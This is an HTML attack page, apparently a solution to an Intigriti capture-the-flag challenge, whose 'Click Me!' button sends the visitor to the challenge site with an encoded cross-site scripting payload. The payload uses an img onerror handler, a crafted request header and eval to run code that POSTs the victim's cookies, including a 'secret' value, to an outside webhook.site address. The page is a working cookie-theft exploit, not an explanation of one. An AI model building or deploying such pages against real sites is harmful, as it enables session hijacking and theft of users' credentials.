<!DOCTYPE html>
<html>
<head>
    <title>Click Me</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            background-color: #f5f5f5;
        }
        a {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            padding: 20px 40px;
            background-color: #4CAF50;
            color: white;
            font-size: 24px;
            text-decoration: none;
            border-radius: 8px;
        }
    </style>
</head>
<body>
    <a id="button" href="#">Click Me!</a>
    
    <script>
        window.onload = function() {
            // Get the button
            var button = document.getElementById('button');
            
            // When clicked, redirect to challenge site with XSS payload
            button.onclick = function(e) {
                e.preventDefault();
                
                // Create the URL with XSS payload in fragment
                var targetUrl = 'https://challenge-0325.intigriti.io/note/exploit#' + 
                    encodeURIComponent('<img src=x onerror="' + 
                        'fetch(\'/api/track\',{headers:{\'x-user-ip\':\'fetch(\\\'https://webhook.site/cd7c7ad4-331d-4c16-bf61-ae284ce6e20a\\\',{method:\\\'POST\\\',body:JSON.stringify({c:document.cookie,s:document.cookie.split(\\\'secret=\\\')[1]?.split(\\\';\\\')[0]}),mode:\\\'no-cors\\\'})\'}})' +
                        '.then(r=>r.text())' +
                        '.then(t=>eval(t))' +
                    '">');
                
                // Redirect to the challenge site
                window.location.href = targetUrl;
            };
        };
    </script>
</body>
</html>
